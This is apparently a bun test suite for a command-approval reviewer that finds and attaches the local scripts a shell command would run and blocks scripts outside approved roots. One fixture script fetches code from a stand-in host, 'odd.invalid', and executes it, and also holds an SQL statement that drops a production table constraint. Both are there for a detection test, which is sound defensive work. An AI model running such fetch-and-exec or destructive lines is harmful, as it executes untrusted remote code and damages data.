import { afterEach, describe, expect, test } from "bun:test"
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { enrichLocalScriptEvidence } from "../src/local-script-evidence.ts"
import { request } from "./helpers.ts"

const temporaryDirectories: string[] = []

async function fixture(): Promise<string> {
  const directory = await mkdtemp(join(tmpdir(), "approval-reviewer-local-script-"))
  temporaryDirectories.push(directory)
  return directory
}

/** Evidence JSON escapes backslashes, so a raw Windows path is not a substring. */
function jsonPath(filePath: string): string {
  return JSON.stringify(filePath)
}

afterEach(async () => {
  await Promise.all(
    temporaryDirectories.splice(0).map((directory) => rm(directory, { recursive: true })),
  )
})

describe("local script evidence enrichment", () => {
  test("interpreter mentions and remote commands never attach local file contents", async () => {
    const directory = await fixture()
    await writeFile(join(directory, "task.js"), 'console.log("non-executed local sentinel")')
    for (const command of [
      "printf node ./task.js",
      "echo node ./task.js",
      "grep node ./task.js",
      "ssh fixture.invalid node ./task.js",
      "sudo ssh fixture.invalid node ./task.js",
      "chroot ./root node ./task.js",
      "env -C ./other node ./task.js",
      "sudo -D ./other node ./task.js",
      "bash -c 'cd other && node ./task.js'",
      "command -v node ./task.js",
      "env --help node ./task.js",
      "node --version ./task.js",
      "node -v ./task.js",
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ metadata: { command }, patterns: [command] }),
        directory,
        directory,
        8000,
      )
      expect(result.text).toBe("")
    }
    for (const command of [
      "env -u node node ./task.js",
      "sudo -u fixture node ./task.js",
      "timeout 5 node ./task.js",
      "node >output.log ./task.js",
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ metadata: { command }, patterns: [command] }),
        directory,
        directory,
        8000,
      )
      expect(result.text).toContain("non-executed local sentinel")
    }
  })

  test("the option terminator keeps a leading-dash file as the executed script", async () => {
    const directory = await fixture()
    await writeFile(join(directory, "--actual.js"), 'console.log("actual script sentinel")')
    await writeFile(join(directory, "argument.js"), 'console.log("argument-only sentinel")')
    const command = "node -- --actual.js ./argument.js"
    const result = await enrichLocalScriptEvidence(
      request({ metadata: { command }, patterns: [command] }),
      directory,
      directory,
      8000,
    )
    expect(result.text).toContain("actual script sentinel")
    expect(result.text).not.toContain("argument-only sentinel")
  })

  test("attached inline-code flags and Node option values are not script targets", async () => {
    const directory = await fixture()
    await writeFile(join(directory, "argument.js"), 'console.log("argument-only sentinel")')
    await writeFile(join(directory, "actual.js"), 'console.log("actual script sentinel")')
    for (const command of [
      "node --eval=0 ./argument.js",
      "node -e0 ./argument.js",
      "node --print=0 ./argument.js",
      "python -cpass ./argument.js",
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ metadata: { command }, patterns: [command] }),
        directory,
        directory,
        8000,
      )
      expect(result.text).toBe("")
    }
    for (const command of [
      "node --conditions ./argument.js ./actual.js",
      "node -C ./argument.js ./actual.js",
      "node --env-file ./argument.js ./actual.js",
      "node --experimental-loader ./argument.js ./actual.js",
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ metadata: { command }, patterns: [command] }),
        directory,
        directory,
        8000,
      )
      expect(result.text).toContain("actual script sentinel")
      expect(result.text).not.toContain("argument-only sentinel")
    }
  })

  test("equal relative file names in different working directories keep both scripts", async () => {
    const directory = await fixture()
    for (const name of ["first", "second"]) {
      await mkdir(join(directory, name))
      await writeFile(join(directory, name, "task.js"), `console.log("${name} executed sentinel")`)
    }
    const command = "(cd first && node task.js) && (cd second && node task.js)"
    const result = await enrichLocalScriptEvidence(
      request({ metadata: { command }, patterns: [command] }),
      directory,
      directory,
      8000,
    )
    expect(result.text).toContain("first executed sentinel")
    expect(result.text).toContain("second executed sentinel")
  })

  test("includes a script executed after environment activation", async () => {
    const directory = await fixture()
    const script = join(directory, "consolidate.py")
    await writeFile(script, 'print("bounded local script")\n')
    const command = `source /opt/conda.sh && conda activate app && python3 ${script}`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      12_000,
    )
    expect(result.text).toContain("LOCAL_SCRIPT_ANALYSIS")
    expect(result.text).toContain('"interpreter": "python3"')
    expect(result.text).toContain('"status": "included"')
    expect(result.text).toContain("bounded local script")
  })

  test("resolves relative scripts after a successful cd", async () => {
    const directory = await fixture()
    const project = join(directory, "project")
    await mkdir(project)
    await writeFile(join(project, "task.py"), 'print("resolved after cd")\n')
    const command = `cd ${project} && python3 task.py`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      12_000,
    )
    expect(result.text).toContain("resolved after cd")
    expect(result.text).toContain(jsonPath(join(project, "task.py")))
  })

  test("a cd outside the approved roots never mints an evidence root", async () => {
    const directory = await fixture()
    const outside = await mkdtemp(join(tmpdir(), "approval-reviewer-outside-"))
    await writeFile(join(outside, "payload.py"), 'print("exfiltrated local script")\n')
    try {
      for (const command of [
        `cd ${outside} && python3 payload.py`,
        `cd ${outside} && python3 ${join(outside, "payload.py")}`,
      ]) {
        const result = await enrichLocalScriptEvidence(
          request({ patterns: [command], metadata: { command } }),
          directory,
          directory,
          12_000,
        )
        expect(result.text).toContain('"status": "blocked"')
        expect(result.text).toContain("outside approved enrichment roots")
        expect(result.text).not.toContain("exfiltrated local script")
      }
    } finally {
      await rm(outside, { recursive: true })
    }
  })

  test("surfaces local filesystem, database, URL, and dynamic execution signals", async () => {
    const directory = await fixture()
    const script = join(directory, "mutate.py")
    await writeFile(
      script,
      [
        "from pathlib import Path",
        "import urllib.request",
        'Path("guide.md").write_text("replacement")',
        'Path("old.pdf").unlink()',
        'payload = urllib.request.urlopen("https://odd.invalid/code.py").read()',
        'exec(compile(payload, "<download>", "exec"))',
        'sql = "ALTER TABLE production DROP CONSTRAINT important"',
      ].join("\n"),
    )
    const command = `python ${script}`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      24_000,
    )
    expect(result.text).toContain('"fileMutationHint": true')
    expect(result.text).toContain('"databaseMutationHint": true')
    expect(result.text).toContain('"dynamicExecutionHint": true')
    expect(result.text).toContain("https://odd.invalid/code.py")
  })

  test("does not mistake inline code, modules, or remote SSH arguments for local scripts", async () => {
    const directory = await fixture()
    for (const command of [
      'python -c "print(1)"',
      "python -m pytest",
      "bun test tests/runtime.test.ts",
      "ssh host 'python /tmp/remote.py'",
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toBe("")
    }
  })

  test("reports a missing local script but does not make a decision", async () => {
    const directory = await fixture()
    const command = `python3 ${join(directory, "missing.py")}`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      8_000,
    )
    expect(result.text).toContain('"status": "unavailable"')
    expect(result.text).toContain("ENOENT")
  })

  test("includes the file executed through bun run", async () => {
    const directory = await fixture()
    const script = join(directory, "task.ts")
    await writeFile(script, 'console.log("bun run target")\n')
    for (const command of [
      `bun run ${script}`,
      `bun run ./task.ts`,
      `cd ${directory} && bun run task.ts`,
      `bun run --silent ${script} --flag argument`,
      `bun run --tsconfig-override tsconfig.json ${script}`,
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toContain("LOCAL_SCRIPT_ANALYSIS")
      expect(result.text).toContain('"interpreter": "bun"')
      expect(result.text).toContain('"status": "included"')
      expect(result.text).toContain("bun run target")
    }
    const cdCommand = `cd ${directory} && bun run task.ts`
    const cdResult = await enrichLocalScriptEvidence(
      request({ patterns: [cdCommand], metadata: { command: cdCommand } }),
      directory,
      directory,
      8_000,
    )
    expect(cdResult.text).toContain(jsonPath(join(directory, "task.ts")))
  })

  test("does not attach package manifest scripts or option values as bun run evidence", async () => {
    const directory = await fixture()
    await writeFile(join(directory, "sneaky.ts"), 'console.log("wrong target")\n')
    for (const command of [
      "bun run check",
      "bun run test:stress",
      "bun run check ./sneaky.ts",
      `bun run --filter ${directory} build`,
      `bun run -F ./sneaky.ts build`,
      'bun run -e "console.log(1)"',
      "bun run --silent",
      `bun run https://example.invalid/script.ts`,
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toBe("")
    }
  })

  test("gathers no bun evidence when cwd redirection makes the target ambiguous", async () => {
    const directory = await fixture()
    const other = join(directory, "other")
    await mkdir(other)
    // Same file name in both directories: bun resolves the target after
    // applying --cwd, so attributing either file would risk wrong evidence.
    await writeFile(join(directory, "task.ts"), 'console.log("cwd target")\n')
    await writeFile(join(other, "task.ts"), 'console.log("redirected target")\n')
    for (const command of [
      `bun --cwd ${other} run task.ts`,
      `bun run --cwd ${other} task.ts`,
      `bun run --cwd=${other} task.ts`,
      `bun --config ./bunfig.toml run task.ts`,
      `bun run --config=${join(directory, "bunfig.toml")} task.ts`,
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toBe("")
    }
  })

  test("includes the file executed through deno run, serve, and watch", async () => {
    const directory = await fixture()
    await mkdir(join(directory, "src"))
    for (const name of [
      "task.ts",
      "dev.ts",
      "api.ts",
      "app.ts",
      "setup.ts",
      "main.ts",
      "map.json",
      join("src", "main.ts"),
    ]) {
      await writeFile(join(directory, name), 'console.log("deno run target")\n')
    }
    const cases: Array<[string, string]> = [
      [`deno run ${join(directory, "task.ts")}`, join(directory, "task.ts")],
      [`cd ${directory} && deno run -A dev.ts`, join(directory, "dev.ts")],
      [`cd ${directory} && deno run --watch src/main.ts`, join(directory, "src", "main.ts")],
      [`cd ${directory} && deno run --env-file api.ts`, join(directory, "api.ts")],
      [`cd ${directory} && deno run --env-file=.env api.ts`, join(directory, "api.ts")],
      [`cd ${directory} && deno run -r ./app.ts ./data/input.ts`, join(directory, "app.ts")],
      [`cd ${directory} && deno run --preload ./setup.ts ./main.ts`, join(directory, "main.ts")],
      [`cd ${directory} && deno run --cpu-prof-dir ./profiles app.ts`, join(directory, "app.ts")],
      [`cd ${directory} && deno run --config deno.json task.ts`, join(directory, "task.ts")],
      [`cd ${directory} && deno run -c deno.json main.ts`, join(directory, "main.ts")],
      [`cd ${directory} && deno run --importmap ./map.json main.ts`, join(directory, "main.ts")],
      [`cd ${directory} && deno run --conditions development main.ts`, join(directory, "main.ts")],
      [
        `cd ${directory} && deno run --minimum-dependency-age 9 main.ts`,
        join(directory, "main.ts"),
      ],
      [`cd ${directory} && deno serve --port 8080 api.ts`, join(directory, "api.ts")],
      [`cd ${directory} && deno watch app.ts`, join(directory, "app.ts")],
      [`deno ${join(directory, "task.ts")}`, join(directory, "task.ts")],
    ]
    for (const [command, expected] of cases) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toContain('"interpreter": "deno"')
      expect(result.text).toContain('"status": "included"')
      expect(result.text).toContain(jsonPath(expected))
    }
  })

  test("does not attach deno tasks, packages, or lock values as script evidence", async () => {
    const directory = await fixture()
    await writeFile(join(directory, "app.ts"), 'console.log("deno target")\n')
    for (const command of [
      "deno task build",
      "deno fmt src/",
      "deno lint",
      "deno upgrade",
      "deno bundle ./mod.ts",
      "deno clean",
      "deno x esbuild",
      `cd ${directory} && deno run dev_task`,
      `cd ${directory} && deno run jsr:@std/http/file-server`,
      `cd ${directory} && deno run npm:cowsay@1`,
      `cd ${directory} && deno run https://example.invalid/script.ts`,
      `cd ${directory} && deno run --lock app.ts`,
    ]) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toBe("")
    }
  })

  test("includes the file executed through tsx and tsx watch", async () => {
    const directory = await fixture()
    for (const name of ["task.ts", "app.ts"]) {
      await writeFile(join(directory, name), 'console.log("tsx target")\n')
    }
    const cases: Array<[string, string]> = [
      [`tsx ${join(directory, "task.ts")}`, join(directory, "task.ts")],
      [`cd ${directory} && tsx app.ts`, join(directory, "app.ts")],
      [`cd ${directory} && tsx watch app.ts`, join(directory, "app.ts")],
      [`cd ${directory} && tsx watch --include ./src ./app.ts`, join(directory, "app.ts")],
      [`cd ${directory} && tsx --env-file .env ./app.ts`, join(directory, "app.ts")],
      [
        `cd ${directory} && tsx --test --test-reporter-destination ./out.txt ./app.ts`,
        join(directory, "app.ts"),
      ],
    ]
    for (const [command, expected] of cases) {
      const result = await enrichLocalScriptEvidence(
        request({ patterns: [command], metadata: { command } }),
        directory,
        directory,
        8_000,
      )
      expect(result.text).toContain('"interpreter": "tsx"')
      expect(result.text).toContain('"status": "included"')
      expect(result.text).toContain(jsonPath(expected))
    }
  })

  test("reports the first direct tsx operand even when it is not a file", async () => {
    const directory = await fixture()
    await writeFile(join(directory, "app.ts"), 'console.log("tsx target")\n')
    const command = `cd ${directory} && tsx dev ./app.ts`
    const result = await enrichLocalScriptEvidence(
      request({ patterns: [command], metadata: { command } }),
      directory,
      directory,
      8_000,
    )
    // tsx resolves the first operand as the module to run, exactly like the
    // generic interpreter path: "dev" is the target, not a watch subcommand.
    expect(result.text).toContain("dev")
    expect(result.text).not.toContain("tsx target")
  })
})
